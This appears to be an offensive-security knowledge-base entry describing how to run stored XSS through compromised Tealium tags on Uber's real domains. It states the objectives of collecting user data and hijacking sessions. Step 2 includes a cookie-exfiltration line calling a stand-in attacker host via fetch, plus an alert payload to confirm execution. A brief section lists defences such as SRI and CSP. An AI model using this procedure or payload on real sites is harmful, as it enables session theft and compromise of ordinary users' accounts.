---
id: proc-tealium-xss-execute-001
tags:
  - stored-xss
  - uber
  - tealium
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-13T23:55:38.369Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Execute-Stored-XSS-via-Tealium-Tags-on-Uber-Domains

## Summary

This procedure leverages injected JavaScript in Tealium tags to execute stored XSS attacks on Uber domains, where the tags are loaded as third-party scripts, allowing arbitrary code execution in users' browsers.

## Description

Uber integrates Tealium tags on various subdomains (e.g., uber.com, driver.uber.com), loading them dynamically. Compromised tags deliver persistent XSS payloads that run in the site's context, enabling session hijacking, data theft, or phishing. Discovered via Tealium analysis, this affects all users visiting impacted pages. Prerequisites: Injected payloads from prior steps. Outcomes: Widespread client-side compromise.

## Requirements

1. Deployed malicious tags on Tealium CDN.
2. Access to Uber domains for testing execution.
3. Browser with console monitoring.

## Defense

Defensive measures and detection strategies:

- Subresource Integrity (SRI) hashes for third-party scripts to prevent tampering.
- Content Security Policy (CSP) to restrict script sources and inline execution.
- Monitor for XSS indicators like unexpected network requests from site pages.

## Objectives

1. Trigger payload execution on target domains.
2. Collect user data or hijack sessions.
3. Demonstrate cross-domain impact.

## Instructions

### Step 1: Load Infected Page

**Context**: Visit an Uber page that includes Tealium tags to initiate script loading.

Navigate to `https://www.uber.com/` in a browser. The page will fetch and execute tags from `https://tags.tiqcdn.com/utag/uber/*`.

### Step 2: Observe Execution

**Context**: Monitor for payload activation in the browser environment.

Open developer tools (F12) and watch the console/network tabs. The injected JS should execute, e.g., sending `fetch('https://attacker.com?cookie=' + document.cookie)`.

For verification, use a simple alert payload:

```javascript
// Injected in tag
alert('Stored XSS via Tealium');
```

> Alert pops on page load, confirming execution.

### Step 3: Assess Impact

**Context**: Evaluate the attack's reach across domains.

Test multiple Uber subdomains to confirm tag loading and execution consistency.

**Expected Output**: Payload runs without errors, affecting session.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[stored-xss]]
- [[uber]]
- [[tealium]]
